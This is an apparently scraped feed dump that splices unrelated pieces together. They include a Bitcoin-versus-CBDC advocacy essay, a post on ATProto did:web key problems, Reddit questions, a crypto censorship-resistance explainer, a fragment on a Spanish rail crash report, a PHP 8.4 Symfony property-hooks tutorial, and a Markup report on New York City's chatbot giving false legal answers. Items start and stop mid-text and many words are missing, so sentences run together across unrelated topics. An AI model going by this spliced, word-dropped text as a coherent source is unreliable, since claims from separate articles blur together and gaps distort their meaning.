argue that governments have power that Kodak never had. They can regulate. They can ban. They can use the force of law.They're right, of course. But this misses the point entirely.Kodak didn't fail because they lacked power over their customers. They failed because the underlying technology shifted, and the old business model became obsolete faster than the old company could adapt. No amount of market power can protect you when the market itself is changing.Money is undergoing the same fundamental shift. For thousands of years, money required a trusted intermediary, someone to mint the coins, someone to issue the notes, someone to validate the ledgers. Trusted intermediaries meant centralized power. Centralized power meant the ability to debase, confiscate, and control.Bitcoin changed the equation. For the first time in human history, we have money that works without trusted intermediaries. Money that's globally accessible, cryptographically secure, provably scarce, and resistant to seizure or debasement.This isn't an incremental improvement. This is a fundamental change in what money can be, as fundamental as the change from analog to digital photography.Central banks launching CBDCs is like Kodak launching Photo CD. It's an admission that change is happening, coupled with a desperate attempt to control that change rather than embrace it. It's innovation in service of preservation.There's a reason Brian Armstrong stayed calm during that exchange in Davos. He wasn't trying to convince the French Central Bank Governor. You can't convince someone whose salary depends on not understanding.Armstrong was speaking to everyone else. To the entrepreneurs building on Bitcoin. To the investors watching capital flow. To the citizens of countries experiencing monetary mismanagement. To anyone willing to think independently about what money should be.The choice is binary, and it's the same choice photography faced:Photo CD or digital camera?Proprietary format that preserves the old model, or open standard that enables the new one?Programmable money that enhances state control, or programmable money that enhances individual sovereignty?Managed decline or creative destruction?The comfortable illusion that we can preserve the old system with new technology, or the uncomfortable truth that paradigm shifts don't ask permission?In 1990, when digital cameras started appearing, Kodak executives dismissed them. The resolution was too low. The workflow was too complicated. Customers loved film. The barriers to entry in film manufacturing protected them.They were right about all of those things in 1990. They were catastrophically wrong about where things were headed.In 2026, when Bitcoin crossed $100,000 and central banks started taking it seriously enough to issue CBDCs, many of those same central bankers laughed at the idea that Bitcoin could compete with fiat currencies. The volatility was too high. The user experience was too complicated. People trusted government money. Legal tender laws protected them.They're right about some of those things today. But they're missing the direction of travel.Photo CD worked, technically. But it was solving the wrong problem. It was trying to make the transition from analog to digital while keeping the analog infrastructure intact.CBDCs will work, technically. But they're solving the wrong problem. They're trying to make the transition from centralized to decentralized money while keeping the centralized power structure intact.The market doesn't care about your compromise solutions. The market cares about what works better for users. And just as digital cameras worked better than film + Photo CD, Bitcoin works better than fiat + CBDCs for anyone who values: over infinite money printing access over gatekeepers over opaque monetary policy over surveillanceThe Verdict Is Already InHere's the thing about paradigm shifts i.e. by the time the old guard realizes what's happening, the new paradigm has usually already won. The lag time between "they're laughing at us" and "they're fighting us" and "we won" can feel glacially slow when you're living through it. But from a historical perspective, these transitions happen remarkably fast.Kodak filed for bankruptcy in 2012, just 22 years after launching Photo CD. The company that had dominated photography for over a century was gone in a generation.How long will it take for central banks to realize that CBDCs are their Photo CD moment? That they're building sophisticated technology to preserve an obsolete system? That the laughter in Davos was the sound of people who haven't yet realized they've already lost?I don't know. But I do know this i.e. the French Central Bank Governor's laughter will stop. Just like Kodak's dismissiveness stopped. Not because Bitcoin convinced them, but because the market made their opinion irrelevant.But here's what makes this paradigm shift different from Kodak's fall and ultimately more inevitable:Photography was about capturing moments. When digital cameras proved superior, professionals switched, then enthusiasts, then everyone else. It was a technological transition driven by better tools.But money? Money is about . About our labor, our savings, our future, our families, our freedom. And the uncomfortable truth that people are beginning to understand is this i.e. fiat currency was never designed with them in mind.Fiat was designed for governments to fund wars without immediate taxation. It was designed to allow deficit spending without political accountability. It was designed to transfer wealth silently through inflation from savers to debtors, from citizens to states. It was designed to give central planners the power to manipulate economic behavior through monetary policy.These weren't bugs. They were features. Features that benefited those who control the system at the expense of those who simply use it.When people truly internalize this, when they understand that their purchasing power declining isn't an unfortunate side effect but an intended outcome, that their savings being debased isn't bad luck but policy, that their financial privacy disappearing isn't about safety but about control, they don't just switch technologies.And that paradigm points directly to Bitcoin and crypto.Not because Bitcoin is perfect. Not because crypto solves every problem. But because for the first time in modern history, people have a choice. They can opt into a monetary system that's:, not for governments in its rules, not subject to political whims in supply, not infinite in creation to anyone with internet, not controlled by gatekeepers at the individual level, not the institutional levelThe question isn't whether CBDCs or Bitcoin will win. That question was answered the moment Bitcoin proved that money could work without centralized control, just as digital cameras proved that photography could work without film.The only question is how long it takes everyone else to realize it.And critically: how many people need to wake up before the paradigm shifts irreversibly?History suggests the answer is i.e. not as many as you think. Technological adoption follows an S curve. It seems slow, then suddenly it's everywhere. We're still in the "slow" phase where central bankers laugh. But every person who studies Bitcoin for their 10,000 hours, every business that adds it to their treasury, every country that accumulates it as a strategic reserve, they're not going back.You can't un ring this bell.And whether you're positioned on the right side of history when enough people wake up to the truth about fiat currency determines more than your portfolio returns.It determines whether you saw the paradigm shift coming, or whether you laughed at it like a French central banker in Davos.As my previous article argued, fiat systems can't respond to community values and needs the way Bitcoin can. But this goes deeper. Central banks can't even respond to their own obsolescence. They're too invested in the old system to imagine the new one.Kodak invented the digital camera and went bankrupt anyway. Central banks understand blockchain technology and will lose their monopoly anyway.Some patterns in history don't just rhyme. They repeat exactly.And they always end the same way.The difference this time? Money is about people. And people are waking up. When they realize fiat was designed to benefit the system, not them, they won't just adopt new technology. They'll shift the entire paradigm.That paradigm points to Bitcoin and crypto.The only question is whether you'll be laughing in Davos or whether you'll be ready.]]></content:encoded></item><item><title>I was right about ATProto key management</title><link>https://notes.nora.codes/atproto-again/</link><author>todsacerdoti</author><category>hn</category><pubDate>Sun, 25 Jan 2026 19:31:23 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[Note: this post has been revised to be split into two sections: a description of what happened, and my analysis. I hope to make it clear that, while I do not like ATProto in general, I am trying to make good-faith critcisms of specific design decisions and outcomes, and in fact, this post getting updoots on HackerNews appears to have gotten the attention of the team, so, mission accomplished. ref, ref My account has since been manually reinstated; this has not happened for any of the other users that have had this issue, as far as I know.Today, I tried setting up an ATProto account for use with Bluesky, with did:web instead of did:plc. Let’s walk through the process:Set up the PDS software on a server I control. Because I use NixOS, this was very easy.Create a did:web. This means creating a public-private keypair; I initially tried following this tutorial from Mai Lapyst, but it’s very out of date, and doesn’t include a critical step.With that did:web, upload the  document to my webserver and set the appropriate DNS entries. Easy enough, except that I also had to set the CORS header for the .Create an account on my new PDS. I was able to get an invite and create an account, but it was in the “deactivated” status, and I couldn’t activate it. This had to be done by making requests manually with , reading the error outcomes in the PDS’s logs on my server.Seek help in the ATProto Touchers Discord server, and at their advice delete the account.Start over and re-create everything from scratch, correctly replacing the public key in my DID with the public key from getRecommendedDidCredentials.Log into Bluesky (bsky.app) and get a “Profile does not exist error.”It was at this point that I found this GitHub issue, which seems to imply that, since I deleted my (completely empty and unused) account, my did:web is blacklisted from the remaining mostly-centralized bit of the system, the AppView. The term for this is being “burned”, and it was later confirmed by some more experienced users that this is a known but undocumented behavior of the Bluesky AppView.I had one of my friends who uses Bluesky take a look, and the failure mode is interesting. On Bluesky, I didn’t exist at all. (She could not see my likes, or my follow of her.) On Blacksky production, my display name and bio were visible, but not my posts. On Blacksky’s own AppView, it’s the opposite; my posts appeared under an “invalid” profile. I have been un-“burned” by a manual process, but not because of my support request; this post made it to the front page of Hacker News, and Bryan Newbold saw it there.So, a while ago, I wrote a post called “Key Management, ATProto, and Decentralization” in which I complained about ATProto’s approach to decentralization. Since then, Blacksky has spun up an AppView, which makes it theoretically possible to have an actually decentralized experience on Bluesky. This was my line in the sand, stated many times; I would make an account when and only when it was possible to do so without using anything running on Bluesky-the-company’s hardware. That’s now, so I figured I’d try it.I use lots of systems I don’t love, like Signal, Matrix, and Mastodon. I use them because they give me access to social interaction with people I care about. ATProto, and specifically Bluesky, is the same; I have friends who don’t post anywhere else. Today, I follow them by RSS, but can’t interact with their posts. That’s where my motivation to use the network comes from, along with understanding how, and how well, the newly decentralized AppView layer works.Very little of this process is documented. Sure, the individual endpoints are - kind of - but the only place the whole process is collected in one place is in the comments to this GitHub issue… which is closed as WONTFIX. The documentation for that getRecommendedDidCredentials endpoint that I missed reads in full:Describe the credentials that should be included in the DID doc of an account that is migrating to this service.Note that I am  “migrating”; this account is new. Plus, the JSON keys it returns are almost, but not quite, the same as those in a DID document, and the key it returns actually has to be edited by hand in order to be usable.This is not good!  has been held up as the “less centralized” or “bring your own trust” option, as opposed to , and it seems like there has been very little effort to make it usable, certainly not for “normal” users.But there’s another issue, a bigger issue. Why is a centralized “burn” able to completely prevent me from interacting with people using Bluesky?You may be aware that Mastodon has a similar system. If you set up a Mastodon server and then delete the database, anyone you’ve already federated with won’t federate with you again, because you can’t prove you’re the same instance. It’s a genuine issue - but it wouldn’t have resulted in this, because I hadn’t even made a post on my now-burned did:web identity, nor followed anyone.Even if I had, though, that would have burned  connection, not  connections. 
My experience would be degraded, but not ruined, and I could work with the admins of the affected servers to remediate it.
You could say the same here, of course; I had to get my account back by Bryan Newbold happening to see this post on Hacker News. There is only, really, one connection that matters; maybe two, if you count Blacksky, but their AppView is not generally available yet. That’s centralization. I don’t understand how you could call it anything else.I don’t like Bluesky, or ATProto; I wish we lived in a world were community-driven projects got megabucks and we were all self-hosting little social media servers for our communities. We don’t live in that world, so we have to interoperate with VC-backed, corporate social media. When those platforms call themselves “decentralized”, I think they should deliver.]]></content:encoded></item><item><title>For those using (or avoiding) Crossplane — what’s missing or overkill?</title><link>https://www.reddit.com/r/kubernetes/comments/1qmspvc/for_those_using_or_avoiding_crossplane_whats/</link><author>/u/PhilosopherHead1388</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 19:27:52 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[I’ve built multiple control planes using  and Kubernetes-style reconcilers.Where does Crossplane shine for you?Where does it feel too complex or not worth it?What problems did you  a control plane for but didn’t build one?I’m exploring a startup idea and want to understand , not theoretical ones.   submitted by    /u/PhilosopherHead1388 ]]></content:encoded></item><item><title>Go + HTMX + templ page not rendering (server runs but browser keeps loading)</title><link>https://www.reddit.com/r/golang/comments/1qmsnc3/go_htmx_templ_page_not_rendering_server_runs_but/</link><author>/u/DifficultNews5991</author><category>golang</category><category>reddit</category><pubDate>Sun, 25 Jan 2026 19:25:18 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I’m facing a problem and it’s giving me a real headache.I’m building a web app using Go, HTML, CSS, HTMX, and .templ.I’m intentionally avoiding JavaScript.The issue is: when I run my main.go, the server starts, but when I open the browser, the page never loads / nothing is rendered.

A key detail missing in that concept is according to whom. According to whom, is XYZ obscene, unacceptable, or a threat? Why? And why must everyone else accept that this “who” changes the truth just because they want to? You see, this is why crypto was born: to be censorship-resistant.In our context, censorship-resistance happens when anyone, everywhere, anytime, is capable of accessing and using a crypto network, and no third party (government, company, or powerful individual) can stop them from doing so. Once data or a transaction is recorded in this system, it can’t easily be altered, blocked, or deleted, and nothing can prevent it from being recorded.Let’s see how this plays out.Why Censorship Resistance Matters in FinanceBesides writing or artistic works, monetary transactions can also be censored and stopped.  is even common all across the world, and in many cases includes innocent people. For example, victims from oppressive regimes, in which ‘politically unacceptable’ and ‘threat to security’ mean they’re just disagreeing and being unfairly punished for it.Banks and similar financial firms follow rules established by governments (no matter if they’re good or bad), and they can freeze any account at any moment. As we mentioned above, drastic cases include government oppression, but that’s not the only reason for censorship. PayPal, for instance, has a lot of .In 2005, they blocked an account opened to raise Hurricane Katrina relief funds. After nearly $28,000 were donated in nine hours, the processor alleged fraud and froze the funds. They even refused to donate this money themselves. In 2010, WikiLeaks was its next victim, due to regulatory pressure. Other people have experienced censorship just because they don’t use their accounts enough, so, apparently, that’s suspicious.No one should be able to impede you from transacting with your legitimately owned money, period. Cryptocurrencies were built to avoid this exact situation by providing a technical stack that cannot be tampered with.Tech Doing the Magic in CryptoWe have some techniques that set crypto apart from banks or centralized companies as far as resistance to censorship and openness is concerned: a pseudonymous distributed network, , and consensus mechanisms. They all vary from network to network, but they must be there to even give it a try at being immutable.A distributed network is a system where many computers (called nodes) run the same software and keep copies of the same data. In this case, our software is the involved cryptocurrency.Instead of having a single central server, there are hundreds or thousands of devices worldwide running the same ledger of transactions. No identification for them is required, just a “pseudonym” —which could be an alphanumeric address. If one node goes out, the rest keep working, and anyone can be part of this. Anyone can be their own node.Political decentralization implies that control of that distributed network is also distributed: no single party (company, organization, or individual) can make big decisions. In many cases, the code is open-source (anyone can check it and modify it), nodes are , and there are no companies behind. Even if there are, they shouldn’t hold the power to change the network.Finally, consensus mechanisms are the processes that allow those nodes to agree on the same result, without needing to know or trust each other. They’re not a list of recommendations, but a set of strict, automated rules engraved in unchallengeable code. Examples of it include Proof of Work (PoW) and Proof-of-Stake (PoS).By mixing these elements, we can avoid censorship most of the time, because there’s no single place or party to shut down or take over. If a powerful faction wants to block funds, they’d need to stop all these independent nodes at once or change all previous transactions. Furthermore, operations are governed solely by the rules of the code.Bitcoin is, of course, the first example of this kind of decentralized currency. It’s not perfect (nothing is), but it’s been robust enough to get this far since its launch in 2009 by an anonymous author. It’s open-source, pseudonymous, and there’s no company or organization behind it. Just a network formed by thousands of nodes worldwide.Its consensus mechanism is Proof-of-Work, in which every node must provide some ‘work’ by solving a complex cryptographic puzzle () before getting the right to add a new batch (block) of valid transactions.Until now, no one has been able to block Bitcoin transactions at the protocol level. There are some risks with a PoW system, though, because miners are the ones deciding which transactions to include in a block. A 51% attack could happen if most of the miners collude: they could change the blockchain history. However, this is unlikely and  in big networks like Bitcoin. The cost is usually not worth it. While rewriting the history is expensive, preventing individual transactions from being included in blocks is possible and costs nothing, if the 51% majority of miners agrees to do so.Ethereum is also a distributed, open-source network, but it uses another consensus mechanism: Proof-of-Stake. This one replaces miners and ‘work’ for “validators” and tokens. Nodes must block (stake) a certain number of coins if they want the right to approve transactions. This ‘right’ could lead to censorship, though. After the  sanctions, for instance, some validators simply played it safe and skipped the sanctioned transactions. takes a step further by getting rid of all middlemen between a transaction and its final approval —including miners and “validators.” This crypto network uses a Directed Acyclic Graph (DAG) instead of a blockchain, which allows every user to add their own transactions to the system. No external approval needed. This way, Obyte is a more censorship-resistant and decentralized ecosystem.For better or for worse, cryptocurrencies aren’t disconnected from the traditional financial system… and that means their ‘decentralized’ powers have limits. If you want to trade them for your national currency, there’ll be compliance rules.  on exchanges. Risk of blocked accounts and frozen funds on exchanges, of course. No matter how censorship-resistant the crypto network is, per se, if you’re using the services of a middleman (a company). These are at the mercy of regulations and potential censorship. are another big limit as well. Some countries have banned crypto entirely, or have put heavy limitations to its use. For instance, it’s completely illegal for individuals in Morocco to use crypto, and even a French man  and jailed for it. Checking related laws in every jurisdiction is important to avoid trouble as a user, even if, in theory, no one can stop you from opening a wallet and using crypto.Still, censorship-resistant crypto keeps improving. As tools become more decentralized and user-friendly, people can rely less on fiat currencies and middlemen and gain more control over their money, while regulated environments still exist in parallel.:::info

"Carriage six derailed due to a complete lack of continuity in the track," the preliminary report finds.Most of those killed and injured were in the front carriages of the state-operated train.Earlier this week, Spanish Transport Minister Óscar Puente confirmed reports that grooves were found on the wheels of the Iryo train's carriages, which had passed over the track safely."These notches in the wheels and the deformation observed in the track are compatible with the fact that the track was cracked," the CIAF preliminary report said.It added that three trains that had gone over the tracks at 17:21 on Sunday, 19:01 and then 19:09 had similar notches "with a compatible geometric pattern".Similar grooves are found on carriages two, three and four of the Iryo train, the report says, but carriage five  - the last that did not derail -  had a groove on its outer edge, suggesting the rail was already tilting outwards before carriage six derailed.The CIAF called its report a "working hypothesis", adding that it "must be corroborated by later detailed calculations and analysis".The transport minister appeared before reporters again on Friday to say that it was too early to have definitive answers, but that if the cause of the crash was the fracture, then it occurred in the minutes and hours before the derailment and could not have been detected.The Adamuz disaster is is the country's worst rail crash in more than a decade. In 2013, Spain suffered its worst high-speed train derailment in Galicia, north-west Spain, which left 80 people dead and 140 others injured.]]></content:encoded></item><item><title>First, make me care</title><link>https://gwern.net/blog/2026/make-me-care</link><author>andsoitis</author><category>hn</category><pubDate>Sun, 25 Jan 2026 19:03:40 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>AI Just Passed the Turing Test for Piano Music</title><link>https://hackernoon.com/ai-just-passed-the-turing-test-for-piano-music?source=rss</link><author>aimodels44</author><category>tech</category><pubDate>Sun, 25 Jan 2026 19:00:00 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[A new study shows AI-generated piano music is so convincing that human listeners can’t reliably tell it apart from human compositions.]]></content:encoded></item><item><title>LACT 0.8.4 Brings Improved Overclocking UI For GPUs On Linux</title><link>https://www.phoronix.com/news/LACT-0.8.4-Released</link><author>Michael Larabel</author><category>tech</category><pubDate>Sun, 25 Jan 2026 18:58:09 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[In the absence of any official GUI control panel from AMD or Intel for their graphics cards on Linux, LACT remains a popular choice particularly for AMD Radeon Linux gamers/enthusiasts to manage various aspects of their GPU from a convenient UI.

For over a decade, we have religiously generated getters and setters, bloating our entities and DTOs with boilerplate that adds visual noise but zero business value.\
With PHP 8.4’s introduction of  and , we can finally retire the “Java-fication” of PHP objects. We can write concise, expressive domain models that encapsulate behavior without the verbosity.\
In this article, I will explore how to modernize a Symfony 7.4 application using these features. I will refactor a legacy-style Doctrine entity into a modern, lean PHP 8.4 component, ensuring full compatibility with Symfony’s Serializer, Validator, and Forms.Before we dive into the code, let’s ensure you are running the correct stack. Symfony 7.4 is the Long-Term Support version released in November 2025.\
Ensure your local environment is ready. Run the following commands:php -v
# Output must indicate PHP 8.4.0 or higher

composer version
# Ensure you are on Composer 2.8+
\
We will use standard Symfony 7.4 components. If you are starting a new project:composer create-project symfony/skeleton:7.4.* my_project
cd my_project
composer require symfony/webapp-pack:7.4.*
composer require symfony/orm-pack
composer require symfony/serializer-pack
composer require symfony/validator-pack
\
If you are upgrading an existing project, ensure your  restricts  to  and  packages to .Asymmetric Visibility: The End of Getter/Setter BoilerplateFor years, we made properties private and added public getters to prevent external modification, while allowing internal access.\
The Old Way (PHP 8.3 and below):class User
{
    private string $email;

    public function __construct(string $email)
    {
        $this->email = $email;
    }

    public function getEmail(): string
    {
        return $this->email;
    }

    // No setter meant it was effectively "read-only" externally, 
    // but we still needed the getter to read it.
}
\
: Asymmetric visibility allows us to define the “set” permission independently of the “get” permission.class User
{
    // Publicly readable, but only writeable by the class itself (private)
    public private(set) string $email;

    public function __construct(string $email)
    {
        $this->email = $email;
    }
}
Integration with DoctrineThis works seamlessly with Doctrine ORM in Symfony 7.4. Doctrine uses reflection to hydrate properties, bypassing visibility guards, so  is perfectly safe for mapped entities.namespace App\Entity;

use Doctrine\ORM\Mapping as ORM;
use Symfony\Component\Validator\Constraints as Assert;

#[ORM\Entity]
class Product
{
    #[ORM\Id]
    #[ORM\GeneratedValue]
    #[ORM\Column]
    public private(set) ?int $id = null;

    #[ORM\Column(length: 255)]
    #[Assert\NotBlank]
    public private(set) string $name;

    #[ORM\Column]
    #[Assert\PositiveOrZero]
    public private(set) int $stock = 0;

    public function __construct(string $name)
    {
        $this->name = $name;
    }

    // Business logic method to mutate state
    public function addToStock(int $quantity): void
    {
        if ($quantity < 1) {
            throw new \InvalidArgumentException('Quantity must be positive');
        }
        $this->stock += $quantity;
    }
}
: No getId(), getName(), getStock().: $product->stock = 100 triggers a fatal error from outside the class. You must use addToStock(), enforcing your business rules.DX (Developer Experience): Autocompletion works directly on properties ($product->name), which feels more “native” than method calls.Property Hooks: Intelligent PropertiesWhile Asymmetric Visibility controls ,  allow us to control behavior. They replace magic methods (__get, __set) and explicit getters/setters with logic attached directly to the property.Data Normalization (The set hook)Imagine a User entity where the email must always be stored in lowercase.namespace App\Entity;

use Doctrine\ORM\Mapping as ORM;

#[ORM\Entity]
class User
{
    #[ORM\Id]
    #[ORM\GeneratedValue]
    #[ORM\Column]
    public private(set) ?int $id = null;

    #[ORM\Column(length: 180, unique: true)]
    public string $email {
        // The 'set' hook intercepts assignment
        set(string $value) {
            if (!filter_var($value, FILTER_VALIDATE_EMAIL)) {
                throw new \InvalidArgumentException("Invalid email format");
            }
            // The backing value is updated automatically via this assignment
            $this->email = strtolower($value);
        }
    }

    public function __construct(string $email)
    {
        // This triggers the set hook!
        $this->email = $email;
    }
}
$user = new User('ADMIN@Example.com');
echo $user->email; // Outputs: admin@example.com
Virtual Properties (The get hook)Virtual properties do not store data; they calculate it on the fly. This is perfect for convenience accessors in Symfony DTOs or Entities that don’t need to be persisted to the database.namespace App\Entity;

use Doctrine\ORM\Mapping as ORM;

#[ORM\Entity]
class Customer
{
    #[ORM\Column]
    public string $firstName;

    #[ORM\Column]
    public string $lastName;

    // This is a VIRTUAL property. It has no storage in memory.
    // Notice we do NOT add #[ORM\Column] because it's not in the DB.
    public string $fullName {
        get => $this->firstName . ' ' . $this->lastName;
    }
}
Integration with Symfony SerializerOne of the most powerful features of Property Hooks in Symfony 7.4 is how the Serializer component handles them.: Serialized normally.: If they are public, the Serializer treats them just like real properties. You no longer need  on a  method.namespace App\Controller;

use App\Entity\Customer;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\Routing\Attribute\Route;

class CustomerController extends AbstractController
{
    #[Route('/customer/{id}', methods: ['GET'])]
    public function show(Customer $customer): JsonResponse
    {
        // Serialization automatically includes "fullName" in the JSON output
        return $this->json($customer);
    }
}
{
  "firstName": "Jane",
  "lastName": "Doe",
  "fullName": "Jane Doe"
}
Advanced Pattern: Value Objects & DTOsLet’s look at a more complex scenario involving a Data Transfer Object (DTO) for a Symfony Form or API payload. We will use  directly on hooked properties.namespace App\DTO;

use Symfony\Component\Validator\Constraints as Assert;

class RegistrationRequest
{
    #[Assert\NotBlank]
    public string $firstName;

    #[Assert\NotBlank]
    public string $lastName;

    // A 'write-only' property behavior for passwords using a hook
    // We only want to set it, but reading it might return a masked value or be disallowed
    public string $password {
        set(string $value) {
            $this->password = password_hash($value, PASSWORD_BCRYPT);
        }
        get => '***MASKED***'; 
    }

    // Combining hooks with asymmetric visibility
    // Publicly readable, but only settable internally or by hydration
    public private(set) \DateTimeImmutable $registeredAt {
        get => $this->registeredAt ?? new \DateTimeImmutable();
    }
}
\
: Be careful with the get hook on $registeredAt above. If the property is uninitialized, accessing it via $this->registeredAt inside the hook causes infinite recursion. The ?? check is a safe pattern if the backing field might be null.Refactoring a Legacy ServiceLet’s look at a Service class. Traditionally, we might inject dependencies and use standard methods. With PHP 8.4, we can make our service configurations cleaner.\
: An  that needs a default “sender” address, but we want to allow changing it temporarily with strict validation.namespace App\Service;

use Symfony\Component\Mailer\MailerInterface;
use Symfony\Component\Mime\Email;

class EmailService
{
    public function __construct(
        private readonly MailerInterface $mailer,
        // Property Hook to validate configuration immediately
        public string $defaultSender {
            set(string $value) {
                if (!filter_var($value, FILTER_VALIDATE_EMAIL)) {
                    throw new \InvalidArgumentException("Invalid sender email");
                }
                $this->defaultSender = $value;
            }
        }
    ) {}

    public function sendWelcomeEmail(string $recipient): void
    {
        $email = (new Email())
            ->from($this->defaultSender)
            ->to($recipient)
            ->subject('Welcome!')
            ->text('Welcome to our platform.');

        $this->mailer->send($email);
    }
}
services:
    App\Service\EmailService:
        arguments:
            $mailer: '@mailer'
            $defaultSender: '%env(DEFAULT_EMAIL_SENDER)%'
\
If the environment variable  contains an invalid email, the service instantiation will fail immediately with a clear Exception, rather than failing silently later when the email is sent. This “Fail Fast” approach is enhanced by property hooks.Symfony Forms rely heavily on the  component to read and write data to your objects.\
: The  in Symfony 7.4  PHP 8.4 hooks.When the form reads data to populate fields, it triggers the  hook.When the form submits data back to the object, it triggers the  hook.You can often remove Form Data Transformers by moving the logic to the Entity/DTO hook.// Old way: create a CallbackTransformer to handle string-to-array conversion
// New way:

class TagAwareDTO
{
    /** @var string[] */
    private array $tags = [];

    // The form field can be mapped to 'tagString'
    // The underlying data is stored in $tags array
    public string $tagString {
        get => implode(', ', $this->tags);
        set(string $value) {
            $this->tags = array_map('trim', explode(',', $value));
        }
    }

    public function getTags(): array
    {
        return $this->tags;
    }
}
$builder->add('tagString', TextType::class, [
    'label' => 'Tags (comma separated)',
]);
\
This simplifies the  significantly, keeping the data transformation logic within the domain object where it belongs.While these features are excellent, “Senior” developers know when not to use them.When you  an object, PHP performs a shallow copy. If you use asymmetric visibility, the cloned object retains the same visibility rules.\
However, be careful with . If a virtual property depends on another object (e.g., ) and you clone the parent object but not the internal , the virtual property might still point to the old user reference. This is standard PHP object behavior, but hooks can hide this complexity.Doctrine uses Proxies (subclasses) for lazy loading.: Works fine because Doctrine uses Reflection to set private properties.: If you define a hook on a mapped property, Doctrine  trigger it when hydrating the entity  it uses reflection (which it does). However, be very careful about adding side effects (like logging or database calls) inside a  of a Doctrine entity. When Doctrine hydrates the object from the DB, you do  want those side effects to run.\
: Avoid side-effects (logging, API calls) in Entity hooks. Keep hooks strictly for data validation and transformation.Don’t put 50 lines of business logic inside a set hook. If the logic is complex, delegate it to a private method or, better yet, a Service. Hooks should be concise.public string $status {
    set {
        // 50 lines of code checking permissions, logging to DB, sending emails...
    }
}
public string $status {
    set {
        $this->validateStatusTransition($value);
        $this->status = $value;
    }
}
Migration Guide: From 7.3/8.3 to 7.4/8.4If you are upgrading a massive codebase, do not try to rewrite everything at once.. Run a regex search or use Rector (once updated for 8.4) to replace private properties + simple getters with public private(set). \n : private type $prop; … getProp() { return $this->prop; } \n : public private(set) type $prop;Virtual Properties for API Resources. Look for classes with #[SerializedName(‘virtual_field’)] and ) methods. Convert them to virtual properties.. Move simple Assert logic that transforms data (like  or ) from controllers/listeners into Property Hooks. and  allow us to write code that is arguably the cleanest in the history of the language. We are moving away from the verbose, “dumb” data structures of the past toward intelligent, self-managing objects.Use  () to expose data safely without getters.Use  for lightweight validation, transformation, and virtual properties.Symfony  and  support these features out of the box in 7.4.Keep hooks pure and fast; avoid heavy side effects.\
The days of generating getters and setters are over. Welcome to the era of modern PHP.\

Sign up forKlaxon, a newsletter that delivers our stories and tools directly to your inbox.\
This article is copublished withDocumented, a nonprofit newsroom that covers New York City’s immigrant communities, andThe City, a non-profit newsroom that serves the people of New York. Sign up for Documented’sand The City’s newsletter,\
In October, New York City announced a plan to harness the power of artificial intelligence to improve the business of government. The announcement included a surprising centerpiece: an AI-powered chatbot that would provide New Yorkers with information on starting and operating a business in the city.\
The problem, however, is that the city’s chatbot is telling businesses to break the law.\
Five months after launch, it’s clear that while the bot appears authoritative, the information it provides on housing policy, worker rights, and rules for entrepreneurs is often incomplete and in worst-case scenarios “dangerously inaccurate,” as one local housing policy expert told The Markup.\
If you’re a landlord wondering which tenants you have to accept, for example, you might pose a question like, “are buildings required to accept section 8 vouchers?” or “do I have to accept tenants on rental assistance?” In testing by The Markup, the bot said no, landlords do not need to accept these tenants. Except, in New York City, it’s illegal for landlords to discriminate by source of income, with a minor exception for small buildings where the landlord or their family lives.Rosalind Black, Citywide Housing Director at the legal assistance nonprofit Legal Services NYC, said that after being alerted to The Markup’s testing of the chatbot, she tested the bot herself and found even more false information on housing. The bot, for example, said it was legal to lock out a tenant, and that “there are no restrictions on the amount of rent that you can charge a residential tenant.” In reality, tenants cannot be locked out if they’ve lived somewhere for 30 days, and there absolutely are restrictions for the many rent-stabilized units in the city.\
Black said these are fundamental pillars of housing policy that the bot was actively misinforming people about. “If this chatbot is not being done in a way that is responsible and accurate, it should be taken down,” she said.\
It’s not just housing policy where the bot has fallen short.\
The NYC bot also appeared clueless about the city’s consumer and worker protections. For example, in 2020, the city council passed a law requiring businesses to accept cash to prevent discrimination against unbanked customers. But the bot didn’t know about that policy when we asked. “Yes, you can make your restaurant cash-free,” the bot said in one wholly false response. “There are no regulations in New York City that require businesses to accept cash as a form of payment.”\
The bot said it was fine to take workers’ tips (wrong, although they sometimes can count tips toward minimum wage requirements) and that there were no regulations on informing staff about scheduling changes (also wrong). It didn’t do better with more specific industries, suggesting it was OK to conceal funeral service prices, for example, which the Federal Trade Commission has outlawed. Similar errors appeared when the questions were asked in other languages, The Markup found.\
It’s hard to know whether anyone has acted on the false information, and the bot doesn’t return the same responses to queries every time. At one point, it told a Markup reporter that landlords  have to accept housing vouchers, but when ten separate Markup staffers asked the same question, the bot told all of them no, buildings did not have to accept housing vouchers.\
The problems aren’t theoretical. When The Markup reached out to Andrew Rigie, Executive Director of the NYC Hospitality Alliance, an advocacy organization for restaurants and bars, he said a business owner had alerted him to inaccuracies and that he’d also seen the bot’s errors himself.\
“A.I. can be a powerful tool to support small business so we commend the city for trying to help,” he said in an email, “but it can also be a massive liability if it’s providing the wrong legal information, so the chatbot needs to be fixed asap and these errors can’t continue.”\
Leslie Brown, a spokesperson for the NYC Office of Technology and Innovation, said in an emailed statement that the city has been clear the chatbot is a pilot program and will improve, but “has already provided thousands of people with timely, accurate answers” about business while disclosing risks to users.\
“We will continue to focus on upgrading this tool so that we can better support small businesses across the city,” Brown said.A Business Bot That May Produce “Incorrect, Harmful or Biased Content”The city’s bot comes with an impressive pedigree. It’s powered by Microsoft’s Azure AI services, which Microsoft says is used by major companies like AT&T and Reddit. Microsoft has also invested heavily in OpenAI, the creators of the hugely popular AI app ChatGPT. It’s even worked with major cities in the past, helping Los Angeles develop a bot in 2017 that could answer hundreds of questions, although the website for that service isn’t available.\
New York City’s bot, according to the initial announcement, would let business owners “access trusted information from more than 2,000 NYC Business web pages,” and explicitly says the page will act as a resource “on topics such as compliance with codes and regulations, available business incentives, and best practices to avoid violations and fines.”\
